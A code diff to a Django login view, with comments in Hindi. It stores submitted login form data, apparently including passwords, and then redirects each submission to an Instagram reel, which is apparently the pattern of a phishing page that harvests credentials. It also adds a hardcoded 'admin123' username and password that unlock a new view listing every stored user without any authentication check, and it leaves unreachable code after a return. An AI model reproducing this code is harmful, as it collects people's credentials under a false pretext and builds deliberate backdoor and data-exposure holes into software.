@@ -1,4 +1,5 @@
-from django.shortcuts import render
+from django.shortcuts import render, redirect
+from .models import User
 from .forms import UserForm
 
 
@@ -14,39 +15,36 @@ def login(request):
 
         if form.is_valid():
 
-            form.save()
-
             username = request.POST.get('username')
             password = request.POST.get('password')
-
-            # Admin login check
+            # Demo admin account ko database me save mat karo
             if username == 'admin123' and password == 'admin123':
-                return render(
-                    request,
-                    'html/admin.html',
-                    {
-                        'username': username,
-                        'password': password
-                    }
-                )
+                return redirect('superuser_view')
 
-            # Normal user
-            return render(
-                request,
-                'html/success.html',
-                {
-                    'username': username,
-                    'password': password,
-                }
-            )
+            # Sirf normal demo users save karo
+            form.save()
 
-        else:
-            return render(
-                request,
-                'html/index.html',
-                {
-                    'error': 'Invalid form data'
-                }
-            )
+        return redirect('https://www.instagram.com/reel/DcCT084Mjn-/')        
+
+        return render(
+            request,
+            'html/index.html',
+            {
+                'error': 'Invalid form data'
+            }
+        )
 
     return render(request, 'html/index.html')
+
+
+def superuser_view(request):
+
+    users = User.objects.all()
+
+    return render(
+        request,
+        'html/admin.html',
+        {
+            'users': users
+        }
+    )
